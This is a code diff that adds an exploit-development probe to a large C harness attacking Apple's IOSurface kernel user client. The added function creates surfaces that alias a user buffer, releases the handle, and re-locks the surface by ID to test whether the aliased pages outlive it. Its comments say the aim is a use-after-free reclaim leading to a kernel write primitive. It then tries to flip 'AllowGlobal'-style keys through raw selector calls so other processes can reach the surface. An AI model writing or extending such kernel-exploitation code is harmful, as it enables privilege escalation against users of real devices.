@@ -23766,6 +23766,194 @@ static void p_afterdeath(void) {
     vm_deallocate(mach_task_self(), (vm_address_t)outb, 0x2000);
 }
 
+// V155 (p_gsurvive): does a client-mem surface outlive its creating task?
+//
+// v154 proved the alias (sel7 surface base == our buffer, 100% marker). The
+// property that would make this a write primitive is LIFETIME: if the surface
+// descriptor survives the task, the pages it aliases return to the general
+// kernel page allocator while the descriptor still points at them — the
+// reclaim target §134/§135 could not reach from the GPU side, because client
+// pages are not scrubbed.
+//
+// Statics (com_apple_iokit_IOSurface) name the exact mechanism:
+//   "Security: Process %s (%d) creating global IOSurfaces accessible to any
+//    other process"
+//   "Security: Process %s (%d) relying on global (insecure) IOSurface lookups"
+// next to the root property names `AllowGlobal` / `AllGlobal`. So global
+// surfaces are exactly the ones that outlive their creator and that other
+// processes may look up.
+//
+// Full cross-process proof needs a second process, which this single-binary
+// harness cannot spawn (one bundle id, sandboxed). What IS provable here, and
+// is the necessary condition, is: does the sid stay resolvable and does the
+// alias stay intact after we drop every reference the kernel handed us?
+// Two phases:
+//   step 1 — create alias, release the userclient handle (sel1), then try to
+//            lock+read by sid. If the alias is still ours afterwards, the
+//            surface is kept alive by the registry, not by our handle.
+//   step 2 — try to flip AllowGlobal through the property path, so a later
+//            second-process run can obtain the sid. Records what the kernel
+//            answers, which distinguishes "gated" from "wrong format".
+static void p_gsurvive(void) {
+    int step = atoi(getenv("FUZZ_GSURV_STEP") ?: "1");
+    LOG("[gs] v155 global-surface survival probe, step %d", step);
+    io_service_t s = IOServiceGetMatchingService(kIOMainPortDefault,
+                        IOServiceMatching("IOSurfaceRoot"));
+    if (!s) { LOG("[gs] no IOSurfaceRoot"); LOG("[gs] done (alive)"); return; }
+    io_connect_t uc = 0;
+    kern_return_t ok = IOServiceOpen(s, mach_task_self(), 0, &uc);
+    IOObjectRelease(s);
+    if (ok || !uc) { LOG("[gs] open failed 0x%08x", ok); LOG("[gs] done (alive)"); return; }
+
+    size_t sz = 0x40000;
+    uint8_t *buf = must_map(sz);
+    const uint8_t MARK = 0xAD;
+    for (size_t i = 0; i < sz; i++) buf[i] = MARK;
+    uint8_t *outb = must_map(0x2000);
+
+    // ---- step 1: alias, then drop our handle, then re-resolve by sid.
+    if (step == 1) {
+        uint64_t sc[2] = { (uint64_t)(uintptr_t)buf, (uint64_t)sz };
+        uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0; size_t osz = 3176;
+        memset(outb, 0, 0x2000);
+        kern_return_t kr = IOConnectCallMethod(uc, 7, sc, 2, NULL, 0, osc, &nosc, outb, &osz);
+        uint32_t sid = *(uint32_t *)(outb + 0x18);
+        LOG("[gs] sel7 -> kr 0x%08x sid %u", kr, sid);
+        fsync(fileno(stderr));
+        if (kr || !sid) { LOG("[gs] step1 aborted"); goto step2; }
+
+        // Drop every kernel-side reference we were handed: release the handle.
+        uint64_t r64 = sid;
+        kern_return_t krel = IOConnectCallScalarMethod(uc, 1, &r64, 1, NULL, NULL);
+        LOG("[gs] sel1 release sid %u -> kr 0x%08x (no client references left)",
+            sid, krel);
+        fsync(fileno(stderr));
+
+        // Now try to use the sid again with no handle. IOSurfaceRoot keeps
+        // surfaces in a global registry, and the IOMemoryDescriptor holds its
+        // own reference to the pages, so this may still resolve.
+        uint8_t *inb = must_map(0x1000);
+        memset(inb, 0, 0x1000);
+        *(uint32_t *)(inb + 0) = sid;
+        *(uint64_t *)(inb + 4) = 0;
+        memset(outb, 0, 0x2000);
+        osz = 3176; nosc = 0;
+        kern_return_t kl = IOConnectCallMethod(uc, 2, NULL, 0, inb, 12,
+                                               osc, &nosc, outb, &osz);
+        LOG("[gs] sel2 lock after release -> kr 0x%08x osz 0x%zx", kl, osz);
+        if (!kl) {
+            uint64_t w[6];
+            for (int i = 0; i < 6; i++) w[i] = *(uint64_t *)(outb + i * 8);
+            uint8_t *sbuf = (uint8_t *)(uintptr_t)w[0];
+            size_t total = (size_t)w[4];
+            LOG("[gs]   base %p alloc %zu (our buf %p)", sbuf, total, buf);
+            if (sbuf && total) {
+                size_t lim = total < sz ? total : sz;
+                long mark = 0;
+                for (size_t i = 0; i < lim; i++) if (sbuf[i] == MARK) mark++;
+                LOG("[gs]   after release: %ld/%zu marker bytes — surface %s",
+                    mark, lim,
+                    mark > (long)(lim / 2) ? "SURVIVED handle release"
+                                           : "lost content");
+            }
+        }
+        fsync(fileno(stderr));
+        vm_deallocate(mach_task_self(), (vm_address_t)inb, 0x1000);
+    }
+
+step2:
+    // ---- step 2: can we ask the root to make surfaces global? Tries the
+    // per-surface set_value path with the documented root keys; the answer
+    // tells us whether a second-process run is even possible.
+    if (step == 2) {
+        // sel9 requires a valid surface id, so make one first.
+        uint64_t sc[2] = { (uint64_t)(uintptr_t)buf, (uint64_t)sz };
+        uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0; size_t osz = 3176;
+        memset(outb, 0, 0x2000);
+        kern_return_t kr = IOConnectCallMethod(uc, 7, sc, 2, NULL, 0, osc, &nosc, outb, &osz);
+        uint32_t sid = *(uint32_t *)(outb + 0x18);
+        LOG("[gs] sel7 for step2 -> kr 0x%08x sid %u", kr, sid);
+        if (kr || !sid) { LOG("[gs] step2 aborted"); }
+        else {
+            // Payload: IOCFSerialize OSArray [value, key]. Hand-rolling the
+            // binary serialization got every key rejected with 0x2c2 — an
+            // earlier revision of this phase did exactly that (same class of
+            // bug as §138's layout parse). Let Foundation produce the
+            // canonical encoding instead, so a rejection means the key is
+            // refused, not that our bytes are malformed.
+            // ---- step 2b: CONTROL via the public API. If IOSurfaceSetValue succeeds on
+    // this very surface but every raw sel9 is refused, then raw sel9 is
+    // unusable from this client (wrong sid space or wrong frame shape) and the
+    // 0x2c2 tells us nothing about the keys. This is the discriminator.
+    {
+        IOSurfaceRef cs = make_surface(64, 64);
+        if (cs) {
+            IOSurfaceID cid = IOSurfaceGetID(cs);
+            CFStringRef k = CFSTR("ProbeKey");
+            int v = 42;
+            CFNumberRef n = CFNumberCreate(NULL, kCFNumberIntType, &v);
+            IOSurfaceSetValue(cs, k, n);
+            LOG("[gs] CONTROL IOSurfaceSetValue('%s') on surface %u (void API)",
+                "ProbeKey", cid);
+            CFTypeRef back = IOSurfaceCopyValue(cs, k);
+            LOG("[gs] CONTROL IOSurfaceCopyValue -> %s", back ? "value present" : "nil");
+            if (back) {
+                int rv = 0;
+                CFNumberGetValue((CFNumberRef)back, kCFNumberIntType, &rv);
+                LOG("[gs] CONTROL round-trip value = %d (expect 42)", rv);
+                CFRelease(back);
+            }
+            CFRelease(n);
+            CFRelease((CFTypeRef)cs);
+        }
+    }
+    const char *keys[] = { "AllowGlobal", "AllGlobal", "IOSurfaceGlobal",
+                                   "GlobalSurface", "AccessibleToAllProcesses",
+                                   // Controls: known-good surface properties.
+                                   // Without these, a blanket 0x2c2 on all keys
+                                   // would be indistinguishable from a broken
+                                   // call path rather than refused keys.
+                                   "IOSurfaceName", "ColorSpace",
+                                   "kShouldBeAccepted" };
+            for (unsigned i = 0; i < sizeof(keys)/sizeof(keys[0]); i++) {
+                int one = 1;
+                CFNumberRef num = CFNumberCreate(NULL, kCFNumberIntType, &one);
+                CFStringRef kstr = CFStringCreateWithCString(NULL, keys[i], kCFStringEncodingUTF8);
+                const void *elems[2] = { num, kstr };
+                CFArrayRef arr = CFArrayCreate(NULL, elems, 2, &kCFTypeArrayCallBacks);
+                CFDataRef data = CFPropertyListCreateData(NULL, arr,
+                            kCFPropertyListBinaryFormat_v1_0, 0, NULL);
+                LOG("[gs] sel9 payload for '%s' = %ld bytes %s%s", keys[i],
+                    data ? (long)CFDataGetLength(data) : -1L,
+                    data ? "" : "(serialisation failed) ",
+                    data ? "" : "");
+                if (data) {
+                    uint8_t *inb = must_map(0x4000);
+                    memset(inb, 0, 0x4000);
+                    *(uint32_t *)(inb + 0) = sid;
+                    size_t n = CFDataGetLength(data);
+                    if (n + 0x0c < 0x4000) {
+                        memcpy(inb + 0x0c, CFDataGetBytePtr(data), n);
+                        memset(outb, 0, 0x2000);
+                        osz = 4; nosc = 0;
+                        kern_return_t k9 = IOConnectCallMethod(uc, 9, NULL, 0,
+                                                    inb, 0x0c + n,
+                                                    osc, &nosc, outb, &osz);
+                        LOG("[gs] sel9 set '%s' -> kr 0x%08x%s", keys[i], k9,
+                            k9 == 0 ? " *** ACCEPTED ***" : "");
+                    }
+                    vm_deallocate(mach_task_self(), (vm_address_t)inb, 0x4000);
+                }
+                CFRelease(data); CFRelease(arr); CFRelease(kstr); CFRelease(num);
+            }
+            uint64_t r64 = sid;
+            IOConnectCallScalarMethod(uc, 1, &r64, 1, NULL, NULL);
+        }
+    }
+    IOServiceClose(uc);
+    LOG("[gs] done (alive)");
+}
+
 // V152 (p_mempool): IOSurfaceRootUserClient sel49-52 — the memory pool.
 // This is the one userclient path that allocates kernel-side pooled memory
 // sized by request, i.e. the classic under-allocation -> out-of-bounds write
@@ -26108,6 +26296,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_SCALERDST")) { p_scalerdst(); LOG("[probe13] scalerdst-only mode, stop"); return NULL; }
         if (getenv("FUZZ_MEMPOOL")) { p_mempool(); LOG("[probe13] mempool-only mode, stop"); return NULL; }
         if (getenv("FUZZ_AFTERDEATH")) { p_afterdeath(); LOG("[probe13] afterdeath-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_GSURV")) { p_gsurvive(); LOG("[probe13] gsurv-only mode, stop"); return NULL; }
         if (getenv("FUZZ_RECLAIM2")) { p_reclaim2(); LOG("[probe13] reclaim2-only mode, stop"); return NULL; }
         if (getenv("FUZZ_RECLAIM")) { p_reclaim(); LOG("[probe13] reclaim-only mode, stop"); return NULL; }
         if (getenv("FUZZ_GPUUAF")) { p_gpuuaf(); LOG("[probe13] gpuuaf-only mode, stop"); return NULL; }
